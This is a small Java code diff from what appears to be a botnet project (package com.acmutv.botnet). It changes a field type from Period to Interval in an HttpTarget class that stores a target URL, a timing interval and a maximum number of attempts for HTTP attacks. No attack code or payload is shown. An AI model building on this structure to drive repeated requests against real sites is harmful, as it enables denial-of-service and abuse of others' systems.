@@ -28,7 +28,7 @@ package com.acmutv.botnet.core.target;
 
 import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.config.AppConfiguration;
-import com.acmutv.botnet.tool.time.Period;
+import com.acmutv.botnet.tool.time.Interval;
 import lombok.AllArgsConstructor;
 import lombok.Data;
 import lombok.NoArgsConstructor;
@@ -49,6 +49,6 @@ import java.net.URL;
 @NoArgsConstructor
 public class HttpTarget {
   private URL url;
-  private Period period;
+  private Interval period;
   private long maxAttempts;
 }
